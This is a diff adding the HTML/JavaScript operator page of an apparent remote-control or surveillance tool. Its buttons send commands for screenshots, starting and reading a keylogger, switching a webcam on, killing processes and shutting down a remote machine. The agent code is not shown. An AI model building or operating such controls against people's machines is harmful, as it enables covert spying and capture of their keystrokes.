@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Remote Control Panel</title>
+<style>
+body { font-family: Arial; padding: 20px; background: #f0f0f0; }
+.container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+h1 { color: #333; text-align: center; }
+.btn-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin: 20px 0; }
+button { padding: 15px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; }
+button:hover { background: #45a049; }
+button.danger { background: #f44336; }
+button.danger:hover { background: #da190b; }
+.input-group { margin: 20px 0; }
+input { padding: 10px; margin: 5px; width: 200px; }
+#output { background: #000; color: #0f0; padding: 15px; height: 300px; overflow-y: auto; font-family: monospace; margin-top: 20px; }
+</style>
+</head>
+<body>
+<div class="container">
+<h1>Remote Control Panel</h1>
+<div id="status">Status: <span id="statusText">Connecting...</span></div>
+<div class="btn-grid">
+<button onclick="sendCmd(1)">List Apps</button>
+<button onclick="sendCmd(4)">List Process</button>
+<button onclick="sendCmd(6)">Screenshot</button>
+<button onclick="sendCmd(7)">Start Keylogger</button>
+<button onclick="sendCmd(8)">Stop Keylogger</button>
+<button onclick="sendCmd(9)">Get Keylog</button>
+<button onclick="sendCmd(10)">Webcam On</button>
+<button onclick="sendCmd(11)">Webcam Off</button>
+<button class="danger" onclick="if(confirm('Shutdown?')) sendCmd(12)">Shutdown</button>
+<button class="danger" onclick="if(confirm('Restart?')) sendCmd(13)">Restart</button>
+</div>
+<div class="input-group">
+<input type="text" id="appName" placeholder="App name">
+<button onclick="stopApp()">Stop App</button>
+<button onclick="startApp()">Start App</button>
+</div>
+<div class="input-group">
+<input type="text" id="pid" placeholder="Process ID">
+<button onclick="killProc()">Kill Process</button>
+</div>
+<div id="output">Output will appear here...</div>
+</div>
+<script>
+function addOutput(text, isHtml = false) {
+  var output = document.getElementById('output');
+  var time = new Date().toLocaleTimeString();
+  if (isHtml) {
+    output.innerHTML += '[' + time + '] ' + text + '<br>';
+  } else {
+    var p = document.createElement('p');
+    p.style.margin = 0;
+    p.textContent = '[' + time + '] ' + text;
+    output.appendChild(p);
+  }
+  output.scrollTop = output.scrollHeight;
+}
+function sendCmd(cmd, data) {
+  data = data || '';
+  addOutput('Sending command ' + cmd + '...', false);
+  fetch('/cmd', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({cmd: cmd, data: data})
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    if (cmd === 6) { // CMD_SCREENSHOT = 6
+      addOutput('Received screenshot data (BMP).', false);
+      return response.blob(); // Xử lý như file nhị phân (ảnh)
+    } else {
+      return response.text(); // XửLý như text (cho các lệnh khác)
+    }
+  })
+  .then(result => {
+    if (cmd === 6) {
+      var imgUrl = URL.createObjectURL(result);
+      var imgTag = '<img src="' + imgUrl + '" style="max-width: 100%;" alt="Screenshot">';
+      addOutput('Screenshot:', true);
+      addOutput(imgTag, true);
+    } else {
+      addOutput(result, false);
+    }
+  })
+  .catch(err => {
+    addOutput('Error: ' + err.message, false);
+  });
+}
+function stopApp() {
+  var name = document.getElementById('appName').value;
+  if(name) sendCmd(2, name);
+}
+function startApp() {
+  var name = document.getElementById('appName').value;
+  if(name) sendCmd(3, name);
+}
+function killProc() {
+  var pid = document.getElementById('pid').value;
+  if(pid) sendCmd(5, pid);
+}
+setInterval(function() {
+  fetch('/status').then(r => r.json()).then(r => {
+    document.getElementById('statusText').textContent = r.connected ? 'Connected' : 'Disconnected';
+  });
+}, 2000);
+</script>
+</body>
+</html>
